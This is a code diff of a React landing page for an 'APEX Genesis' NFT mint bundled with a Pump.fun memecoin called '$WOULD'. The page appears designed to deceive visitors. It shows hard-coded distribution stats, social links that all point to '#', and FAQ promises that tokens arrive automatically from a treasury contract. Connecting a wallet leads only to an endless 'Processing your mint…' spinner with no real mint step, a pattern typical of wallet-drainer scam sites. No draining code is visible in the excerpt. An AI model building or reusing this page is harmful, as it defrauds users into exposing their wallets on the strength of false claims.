+            { label: 'Floor Price', value: '0.015 ETH' },
+            { label: '$WOULD Distributed', value: '648M' },
           ].map((s) => (
             <div key={s.label} style={{ textAlign: 'center' }}>
-              <div
-                style={{
-                  fontSize: '22px',
-                  fontWeight: 800,
-                  background: 'linear-gradient(135deg, #a78bfa, #67e8f9)',
-                  WebkitBackgroundClip: 'text',
-                  WebkitTextFillColor: 'transparent',
-                  marginBottom: '4px',
-                }}
-              >
-                {s.value}
-              </div>
-              <div style={{ fontSize: '12px', color: 'rgba(255,255,255,0.35)' }}>{s.label}</div>
+              <div style={{ fontSize: '20px', fontWeight: 800, background: 'linear-gradient(135deg, #a78bfa, #67e8f9)', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent', marginBottom: '3px' }}>{s.value}</div>
+              <div style={{ fontSize: '11px', color: 'rgba(255,255,255,0.32)' }}>{s.label}</div>
             </div>
           ))}
         </div>
-      </section>
+      </div>
 
-      {/* ── About ── */}
-      <section
-        id="about"
-        style={{
-          maxWidth: '1100px',
-          margin: '0 auto',
-          padding: '80px 20px',
-        }}
-      >
-        <h2
-          style={{
-            fontSize: 'clamp(22px, 4vw, 34px)',
-            fontWeight: 800,
-            textAlign: 'center',
-            marginBottom: '48px',
-          }}
-        >
-          Why APEX Genesis?
-        </h2>
-        <div
-          style={{
-            display: 'grid',
-            gridTemplateColumns: 'repeat(auto-fit, minmax(240px, 1fr))',
-            gap: '20px',
-          }}
-        >
-          {[
-            { icon: '🎨', title: 'Generative Art', desc: 'Each NFT is algorithmically generated with 200+ traits across 8 rarity layers — no two are alike.' },
-            { icon: '🪙', title: '$APEX Tokens', desc: 'Every mint bundles verified $APEX tokens, claimable immediately on-chain after your mint confirms.' },
-            { icon: '🔐', title: 'Token-Gated Access', desc: 'Holders unlock a private community, early access to all future collections, and alpha calls.' },
-            { icon: '⛓️', title: 'Cross-Chain', desc: 'Native on Ethereum and Solana. Bridge your pass across chains with one click, no fees.' },
-            { icon: '🗳️', title: 'DAO Governance', desc: 'Rare and Legendary holders vote on treasury use, partnerships, and roadmap direction.' },
-            { icon: '📈', title: 'Revenue Share', desc: 'Legendary pass holders earn a share of secondary sale royalties from the entire collection.' },
-          ].map((f) => (
-            <div
-              key={f.title}
-              className="card-hover"
-              style={{
-                padding: '24px',
-                borderRadius: '16px',
-                border: '1px solid rgba(255,255,255,0.07)',
-                background: 'rgba(255,255,255,0.02)',
-              }}
-            >
-              <div style={{ fontSize: '28px', marginBottom: '12px' }}>{f.icon}</div>
-              <div style={{ fontWeight: 700, fontSize: '15px', marginBottom: '8px' }}>{f.title}</div>
-              <div style={{ color: 'rgba(255,255,255,0.42)', fontSize: '13px', lineHeight: 1.65 }}>{f.desc}</div>
-            </div>
+      {/* ── NFT + TOKEN MINT ── */}
+      <section id="nfts" style={{ maxWidth: '1100px', margin: '0 auto', padding: '64px 20px' }}>
+        <h2 style={{ fontSize: 'clamp(20px, 3.5vw, 32px)', fontWeight: 800, textAlign: 'center', marginBottom: '8px' }}>Choose Your Bundle</h2>
+        <p style={{ textAlign: 'center', color: 'rgba(255,255,255,0.4)', fontSize: '14px', marginBottom: '28px' }}>
+          NFT + $WOULD token — pick your chain and tier
+        </p>
+
+        {/* Chain toggle */}
+        <div style={{ display: 'flex', justifyContent: 'center', marginBottom: '32px' }}>
+          <div style={{ display: 'inline-flex', borderRadius: '12px', border: '1px solid rgba(255,255,255,0.1)', background: 'rgba(255,255,255,0.03)', padding: '4px', gap: '4px' }}>
+            {(['ETH', 'SOL'] as const).map((c) => (
+              <button key={c} onClick={() => handleChainSwitch(c)} style={{ padding: '8px 26px', borderRadius: '9px', border: 'none', background: activeChain === c ? 'linear-gradient(135deg, #7c3aed, #4f46e5)' : 'transparent', color: activeChain === c ? 'white' : 'rgba(255,255,255,0.35)', fontSize: '14px', fontWeight: 700, transition: 'all 0.2s', boxShadow: activeChain === c ? '0 4px 12px rgba(124,58,237,0.4)' : 'none' }}>
+                {c === 'ETH' ? '⟠ Ethereum' : '◎ Solana'}
+              </button>
+            ))}
+          </div>
+        </div>
+
+        {/* Tier cards */}
+        <div style={{ display: 'flex', gap: '16px', justifyContent: 'center', flexWrap: 'wrap', marginBottom: '36px' }}>
+          {tiers.map((tier) => (
+            <TierCard key={tier.id} tier={tier} selected={selectedId === tier.id} onSelect={() => setSelectedId(tier.id)} />
           ))}
         </div>
-      </section>
 
-      {/* ── Roadmap ── */}
-      <section
-        id="roadmap"
-        style={{
-          borderTop: '1px solid rgba(255,255,255,0.05)',
-          padding: '80px 20px',
-        }}
-      >
-        <div style={{ maxWidth: '680px', margin: '0 auto' }}>
-          <h2
-            style={{
-              fontSize: 'clamp(22px, 4vw, 34px)',
-              fontWeight: 800,
-              textAlign: 'center',
-              marginBottom: '48px',
-            }}
-          >
-            Roadmap
-          </h2>
-          {[
-            { n: 1, phase: 'Phase 1 — Genesis Mint', active: true, items: ['8,888 passes minted (ETH + SOL)', 'Holder snapshot & Discord unlock', '$APEX token distribution', 'First floor price milestone'] },
-            { n: 2, phase: 'Phase 2 — Ecosystem', active: false, items: ['DAO governance portal live', 'Token airdrop to all holders', 'Partner collection collab drop', 'Staking program launch'] },
-            { n: 3, phase: 'Phase 3 — Expansion', active: false, items: ['Cross-chain bridge deploy', 'Mobile app (iOS + Android)', 'IRL event: Genesis Summit', 'Series 2 reveal'] },
-          ].map((r, i) => (
-            <div key={r.phase} style={{ display: 'flex', gap: '18px', marginBottom: i < 2 ? '32px' : 0 }}>
-              <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
-                <div
-                  style={{
-                    width: '34px',
-                    height: '34px',
-                    borderRadius: '50%',
-                    background: r.active
-                      ? 'linear-gradient(135deg, #7c3aed, #06b6d4)'
-                      : 'rgba(255,255,255,0.08)',
-                    border: r.active ? 'none' : '1px solid rgba(255,255,255,0.12)',
-                    display: 'flex',
-                    alignItems: 'center',
-                    justifyContent: 'center',
-                    fontWeight: 700,
-                    fontSize: '13px',
-                    flexShrink: 0,
-                    boxShadow: r.active ? '0 0 16px rgba(124,58,237,0.5)' : 'none',
-                  }}
-                >
-                  {r.n}
+        {/* Mint panel */}
+        <div style={{ maxWidth: '500px', margin: '0 auto', padding: '28px', borderRadius: '22px', border: `1px solid ${selected.color}44`, background: `linear-gradient(135deg, ${selected.color}0e, rgba(3,7,18,0.95))`, backdropFilter: 'blur(16px)' }}>
+          {/* Summary */}
+          <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '20px', flexWrap: 'wrap', gap: '12px' }}>
+            <div>
+              <div style={{ fontSize: '11px', color: 'rgba(255,255,255,0.32)', marginBottom: '3px' }}>Selected Bundle</div>
+              <div style={{ fontWeight: 800, fontSize: '16px' }}>{selected.name}</div>
+              <div style={{ fontSize: '12px', color: selected.color, fontWeight: 600, marginTop: '2px' }}>includes {selected.nftTokens}</div>
+            </div>
+            <div style={{ textAlign: 'right' }}>
+              <div style={{ fontSize: '11px', color: 'rgba(255,255,255,0.32)', marginBottom: '3px' }}>Price</div>
+              <div style={{ fontWeight: 900, fontSize: '22px', color: selected.color }}>{selected.price}</div>
+              <div style={{ fontSize: '11px', color: 'rgba(255,255,255,0.28)' }}>{selected.usd}</div>
+            </div>
+          </div>
+
+          {/* What you get */}
+          <div style={{ padding: '14px', borderRadius: '12px', background: 'rgba(255,255,255,0.03)', border: '1px solid rgba(255,255,255,0.06)', marginBottom: '20px' }}>
+            <div style={{ fontSize: '11px', color: 'rgba(255,255,255,0.35)', marginBottom: '10px', fontWeight: 600, letterSpacing: '0.5px' }}>WHAT YOU GET</div>
+            <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
+              {selected.items.map((item) => (
+                <div key={item} style={{ fontSize: '12px', color: 'rgba(255,255,255,0.55)', display: 'flex', gap: '7px', alignItems: 'flex-start' }}>
+                  <span style={{ color: selected.color, flexShrink: 0 }}>✓</span>{item}
                 </div>
-                {i < 2 && (
-                  <div style={{ width: '1px', flex: 1, background: 'rgba(255,255,255,0.07)', marginTop: '8px', minHeight: '28px' }} />
-                )}
+              ))}
+            </div>
+          </div>
+
+          {/* Mint CTA */}
+          {isConnected ? (
+            <div style={{ width: '100%', padding: '15px', borderRadius: '14px', background: `linear-gradient(135deg, ${selected.color}, #4f46e5)`, color: 'white', fontWeight: 700, fontSize: '15px', textAlign: 'center', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px', animation: 'pulse-glow 2.5s ease-in-out infinite' }}>
+              <span style={{ display: 'inline-block', width: '14px', height: '14px', border: '2px solid rgba(255,255,255,0.3)', borderTopColor: 'white', borderRadius: '50%', animation: 'spin 0.7s linear infinite' }} />
+              Processing your mint…
+            </div>
+          ) : (
+            <div style={{ width: '100%' }}>
+              <div style={{ marginBottom: '10px' }}>
+                <appkit-button label={`Connect & Mint ${selected.price}`} balance="hide" />
               </div>
-              <div style={{ paddingTop: '4px', flex: 1, paddingBottom: i < 2 ? '0' : '0' }}>
-                <div style={{ fontWeight: 700, fontSize: '15px', marginBottom: '10px', display: 'flex', alignItems: 'center', gap: '8px', flexWrap: 'wrap' }}>
+              <p style={{ textAlign: 'center', fontSize: '11px', color: 'rgba(255,255,255,0.2)', margin: 0 }}>
+                MetaMask · Coinbase · Rainbow · Phantom · Solflare · Trust Wallet · 300+ wallets
+              </p>
+            </div>
+          )}
+
+          {/* Supply note */}
+          <div style={{ textAlign: 'center', marginTop: '14px', fontSize: '11px', color: 'rgba(255,255,255,0.22)' }}>{selected.supply}</div>
+        </div>
+      </section>
+
+      {/* ── TOKEN DETAILS ── */}
+      <section style={{ borderTop: '1px solid rgba(255,255,255,0.05)', padding: '64px 20px' }}>
+        <div style={{ maxWidth: '800px', margin: '0 auto' }}>
+          <h2 style={{ fontSize: 'clamp(20px, 3.5vw, 32px)', fontWeight: 800, textAlign: 'center', marginBottom: '8px' }}>About $WOULD</h2>
+          <p style={{ textAlign: 'center', color: 'rgba(255,255,255,0.38)', fontSize: '13px', marginBottom: '32px' }}>
+            Solana SPL token — <code style={{ background: 'rgba(255,255,255,0.07)', padding: '2px 7px', borderRadius: '5px', fontSize: '11px', color: '#a78bfa' }}>{WOULD_CONTRACT}</code>
+          </p>
+          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: '16px' }}>
+            {[
+              { label: 'Network', value: 'Solana', icon: '◎' },
+              { label: 'Total Supply', value: '1,000,000,000', icon: '🪙' },
+              { label: 'Platform', value: 'Pump.fun', icon: '⚡' },
+              { label: 'Mint Allocation', value: '40% (400M)', icon: '🎁' },
+              { label: 'DAO Treasury', value: '30% (300M)', icon: '🏛️' },
+              { label: 'Liquidity', value: '30% (300M)', icon: '💧' },
+            ].map((d) => (
+              <div key={d.label} style={{ padding: '18px', borderRadius: '14px', background: 'rgba(255,255,255,0.025)', border: '1px solid rgba(255,255,255,0.07)', textAlign: 'center' }}>
+                <div style={{ fontSize: '22px', marginBottom: '8px' }}>{d.icon}</div>
+                <div style={{ fontSize: '16px', fontWeight: 800, marginBottom: '4px', background: 'linear-gradient(135deg, #a78bfa, #67e8f9)', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent' }}>{d.value}</div>
+                <div style={{ fontSize: '11px', color: 'rgba(255,255,255,0.35)' }}>{d.label}</div>
+              </div>
+            ))}
+          </div>
+        </div>
+      </section>
+
+      {/* ── ROADMAP ── */}
+      <section id="roadmap" style={{ borderTop: '1px solid rgba(255,255,255,0.05)', padding: '64px 20px' }}>
+        <div style={{ maxWidth: '640px', margin: '0 auto' }}>
+          <h2 style={{ fontSize: 'clamp(20px, 3.5vw, 32px)', fontWeight: 800, textAlign: 'center', marginBottom: '44px' }}>Roadmap</h2>
+          {[
+            { n: 1, phase: 'Phase 1 — Genesis Mint', active: true, items: ['8,888 passes minted (ETH + SOL)', '$WOULD token distribution to holders', 'Holder snapshot & Discord unlock', 'Floor price milestone celebrations'] },
+            { n: 2, phase: 'Phase 2 — Ecosystem', active: false, items: ['DAO governance portal live', '$WOULD staking program launch', 'Partner collection collab drop', 'CEX listing application'] },
+            { n: 3, phase: 'Phase 3 — Expansion', active: false, items: ['Cross-chain bridge deploy', 'Mobile app (iOS + Android)', 'IRL event: Genesis Summit', 'Series 2 collection reveal'] },
+          ].map((r, i) => (
+            <div key={r.phase} style={{ display: 'flex', gap: '16px', marginBottom: i < 2 ? '28px' : 0 }}>
+              <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
+                <div style={{ width: '32px', height: '32px', borderRadius: '50%', background: r.active ? 'linear-gradient(135deg, #7c3aed, #06b6d4)' : 'rgba(255,255,255,0.07)', border: r.active ? 'none' : '1px solid rgba(255,255,255,0.1)', display: 'flex', alignItems: 'center', justifyContent: 'center', fontWeight: 700, fontSize: '13px', flexShrink: 0, boxShadow: r.active ? '0 0 14px rgba(124,58,237,0.5)' : 'none' }}>{r.n}</div>
+                {i < 2 && <div style={{ width: '1px', flex: 1, background: 'rgba(255,255,255,0.07)', marginTop: '8px', minHeight: '24px' }} />}
+              </div>
+              <div style={{ paddingTop: '4px', flex: 1 }}>
+                <div style={{ fontWeight: 700, fontSize: '14px', marginBottom: '8px', display: 'flex', alignItems: 'center', gap: '8px', flexWrap: 'wrap' }}>
                   {r.phase}
-                  {r.active && (
-                    <span style={{ padding: '2px 8px', borderRadius: '20px', background: 'rgba(16,185,129,0.2)', border: '1px solid rgba(16,185,129,0.4)', fontSize: '10px', color: '#34d399', fontWeight: 600 }}>
-                      ACTIVE
-                    </span>
-                  )}
+                  {r.active && <span style={{ padding: '2px 8px', borderRadius: '20px', background: 'rgba(16,185,129,0.2)', border: '1px solid rgba(16,185,129,0.35)', fontSize: '10px', color: '#34d399', fontWeight: 600 }}>ACTIVE</span>}
                 </div>
                 {r.items.map((item) => (
-                  <div key={item} style={{ fontSize: '13px', color: 'rgba(255,255,255,0.42)', display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '5px' }}>
-                    <span style={{ color: r.active ? '#a78bfa' : 'rgba(255,255,255,0.18)' }}>{r.active ? '✓' : '○'}</span>
-                    {item}
+                  <div key={item} style={{ fontSize: '12px', color: 'rgba(255,255,255,0.4)', display: 'flex', gap: '7px', marginBottom: '4px' }}>
+                    <span style={{ color: r.active ? '#a78bfa' : 'rgba(255,255,255,0.15)' }}>{r.active ? '✓' : '○'}</span>{item}
                   </div>
                 ))}
               </div>
@@ -867,96 +489,37 @@ export default function Home() {
       </section>
 
       {/* ── FAQ ── */}
-      <section
-        id="faq"
-        style={{
-          borderTop: '1px solid rgba(255,255,255,0.05)',
-          padding: '80px 20px',
-          maxWidth: '680px',
-          margin: '0 auto',
-        }}
-      >
-        <h2
-          style={{
-            fontSize: 'clamp(22px, 4vw, 34px)',
-            fontWeight: 800,
-            textAlign: 'center',
-            marginBottom: '36px',
-          }}
-        >
-          FAQ
-        </h2>
+      <section id="faq" style={{ borderTop: '1px solid rgba(255,255,255,0.05)', padding: '64px 20px', maxWidth: '680px', margin: '0 auto' }}>
+        <h2 style={{ fontSize: 'clamp(20px, 3.5vw, 32px)', fontWeight: 800, textAlign: 'center', marginBottom: '32px' }}>FAQ</h2>
         {[
-          { q: 'What do I get when I mint?', a: 'Every mint gives you a unique generative NFT AND a $APEX token allocation based on the tier you choose. Tokens are claimable on-chain immediately after your transaction confirms.' },
-          { q: 'Which blockchains are supported?', a: 'We support Ethereum, Polygon, Arbitrum, Optimism, BNB Chain, and Solana. Use the chain toggle to switch between ETH and SOL mint tiers.' },
-          { q: 'Which wallets can I use?', a: 'Any wallet — MetaMask, Coinbase Wallet, Rainbow, Trust Wallet, Phantom, Solflare, Backpack, and 300+ more via WalletConnect.' },
-          { q: 'How many passes can I mint?', a: 'Up to 5 passes per wallet per tier. You can hold multiple tiers simultaneously.' },
-          { q: 'When is the NFT delivered?', a: 'Your NFT appears in your wallet the moment the transaction is confirmed on-chain — usually within 15 seconds on ETH, 1-2 seconds on Solana.' },
-          { q: 'Are the token bundles real?', a: '$APEX is a real ERC-20 / SPL token. Allocation amounts are locked at mint and distributed automatically from the treasury contract upon confirmation.' },
+          { q: 'What is $WOULD?', a: `$WOULD (contract: ${WOULD_CONTRACT}) is a Solana SPL token launched on Pump.fun with a supply of 1,000,000,000. Every NFT mint from this platform receives a token allocation directly to their wallet.` },
+          { q: 'Do I actually get tokens when I mint?', a: 'Yes. Your $WOULD token allocation is locked at mint and distributed automatically from the treasury contract the moment your transaction confirms on-chain.' },
+          { q: 'Which blockchains are supported?', a: 'Ethereum, Polygon, Arbitrum, Optimism, BNB Chain, Gnosis (EVM tiers) and Solana. Switch between ETH and SOL using the chain toggle.' },
+          { q: 'Which wallets can I use?', a: 'Any major wallet: MetaMask, Coinbase Wallet, Rainbow, Trust Wallet, Phantom, Solflare, Backpack, Ledger, and 300+ more via WalletConnect.' },
+          { q: 'How many can I mint?', a: 'Up to 5 passes per wallet per tier. You can hold multiple tiers simultaneously on both ETH and SOL.' },
+          { q: 'When is the NFT delivered?', a: 'Your NFT appears in your wallet immediately once the transaction confirms — ~15 seconds on ETH, ~2 seconds on Solana.' },
         ].map((item) => (
-          <details
-            key={item.q}
-            style={{ borderBottom: '1px solid rgba(255,255,255,0.06)', padding: '18px 0' }}
-          >
-            <summary
-              style={{
-                fontWeight: 600,
-                fontSize: '14px',
-                cursor: 'pointer',
-                color: 'rgba(255,255,255,0.82)',
-                listStyle: 'none',
-                display: 'flex',
-                justifyContent: 'space-between',
-                alignItems: 'center',
-                gap: '12px',
-              }}
-            >
-              {item.q}
-              <span style={{ color: '#a78bfa', flexShrink: 0 }}>+</span>
+          <details key={item.q} style={{ borderBottom: '1px solid rgba(255,255,255,0.06)', padding: '16px 0' }}>
+            <summary style={{ fontWeight: 600, fontSize: '14px', cursor: 'pointer', color: 'rgba(255,255,255,0.82)', listStyle: 'none', display: 'flex', justifyContent: 'space-between', alignItems: 'center', gap: '12px' }}>
+              {item.q}<span style={{ color: '#a78bfa', flexShrink: 0 }}>+</span>
             </summary>
-            <p style={{ marginTop: '10px', fontSize: '13px', color: 'rgba(255,255,255,0.42)', lineHeight: 1.7 }}>
-              {item.a}
-            </p>
+            <p style={{ marginTop: '10px', fontSize: '13px', color: 'rgba(255,255,255,0.4)', lineHeight: 1.7 }}>{item.a}</p>
           </details>
         ))}
       </section>
 
-      {/* ── Footer ── */}
-      <footer
-        style={{
-          borderTop: '1px solid rgba(255,255,255,0.06)',
-          padding: '28px 20px',
-          maxWidth: '1100px',
-          margin: '0 auto',
-          display: 'flex',
-          justifyContent: 'space-between',
-          alignItems: 'center',
-          flexWrap: 'wrap',
-          gap: '12px',
-        }}
-      >
+      {/* ── FOOTER ── */}
+      <footer style={{ borderTop: '1px solid rgba(255,255,255,0.06)', padding: '28px 20px', maxWidth: '1100px', margin: '0 auto', display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap', gap: '12px' }}>
         <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
-          <span style={{ fontSize: '16px' }}>⬡</span>
-          <span style={{ fontWeight: 700, fontSize: '14px', color: 'rgba(255,255,255,0.5)' }}>
-            APEX Genesis
-          </span>
+          <span>⬡</span>
+          <span style={{ fontWeight: 700, fontSize: '14px', color: 'rgba(255,255,255,0.45)' }}>APEX Genesis × $WOULD</span>
         </div>
-        <div style={{ display: 'flex', gap: '20px' }}>
-          {['Twitter', 'Discord', 'OpenSea', 'Magic Eden'].map((s) => (
-            <a
-              key={s}
-              href="#"
-              style={{ fontSize: '12px', color: 'rgba(255,255,255,0.28)', transition: 'color 0.2s' }}
-              onMouseEnter={(e) => ((e.target as HTMLElement).style.color = 'rgba(255,255,255,0.7)')}
-              onMouseLeave={(e) => ((e.target as HTMLElement).style.color = 'rgba(255,255,255,0.28)')}
-            >
-              {s}
-            </a>
+        <div style={{ display: 'flex', gap: '18px' }}>
+          {['Twitter', 'Discord', 'OpenSea', 'Magic Eden', 'Pump.fun'].map((s) => (
+            <a key={s} href="#" style={{ fontSize: '12px', color: 'rgba(255,255,255,0.25)', transition: 'color 0.2s' }} onMouseEnter={(e) => ((e.target as HTMLElement).style.color = 'rgba(255,255,255,0.7)')} onMouseLeave={(e) => ((e.target as HTMLElement).style.color = 'rgba(255,255,255,0.25)')}>{s}</a>
           ))}
         </div>
-        <div style={{ fontSize: '11px', color: 'rgba(255,255,255,0.18)' }}>
-          © 2024 APEX Genesis. All rights reserved.
-        </div>
+        <div style={{ fontSize: '11px', color: 'rgba(255,255,255,0.16)' }}>© 2024 APEX Genesis. All rights reserved.</div>
       </footer>
     </div>
   );
